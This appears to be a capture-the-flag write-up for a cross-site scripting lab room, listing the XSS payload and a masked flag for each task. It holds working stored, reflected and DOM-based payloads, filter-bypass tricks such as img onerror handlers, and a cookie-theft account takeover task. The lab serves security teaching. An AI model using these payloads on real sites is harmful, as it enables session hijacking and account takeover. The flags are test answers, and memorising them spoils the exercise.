# Cross-site Scripting

- Read the introduction.

	  no answer needed

- Deploy the machine and navigate to http://<TARGET_IP>

	  no answer needed

- The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.

	  no answer needed

- Add a comment and see if you can insert some of your own HTML.

	- `<p>comment</p>`
	- `HTML_****`

- Create an alert popup box appear on the page with your document cookies.

	- `<script>alert(document.cookie)</script>`
	- `W3LL_***********`

- Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.

	- ` <script>document.getElementById('thm-title').innerHTML="I am a hacker"</script>`
	- `websites****************************`

- Take over Jack's account by stealing his cookie, what was his cookie value?

	- `s%3Aat0YY*******************************************************`

- Post a comment as Jack.

	- `c00k***********`

- Craft a reflected XSS payload that will cause a popup saying "Hello"

	- `<script>alert("Hello")</script>`
	- `There**************************`

- Craft a reflected XSS payload that will cause a popup with your machines IP address.

	- `<script>alert(window.location.hostname)</script>`
	- `Ref***************`

- Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.

	- `test ' onmouseover="alert(document.cookie)"`
	- `Br******************`

- Create an onhover event on an image tag, that change the background color of the website to red.

	- `test " onhover="document.body.style.backgroundColor='red'`
	- `Jav**************`

- Understand the basic proof of concept script.

	  no answer needed

- Create your own version of an XSS keylogger and see it appear in the logs part of the site.

	  no answer needed

- Bypass the filter that removes any script tags.

	- `<img src="edoardottt" onerror=alert("Helloooo") />`
	- `3c3cf****************************`

- The word alert is filtered, bypass it.

	- The same but with `confirm`.
	- `a2e5e*****************************`

- The word hello is filtered, bypass it.

	- The same but with payload `Hi :)`.
	- `decb*****************************`

- Filtered in challenge 4 is as follows...

	- `<img src="edoardottt" ONERROR="alert('edoardottt')" />`
	- `2482d2****************************`

- Download and experiment with BeEF with the XSS playground.

	  no answer needed

- Take a look at XSS-Payloads.com, download one interesting looking payload and use it on the XSS playground.

	  no answer needed
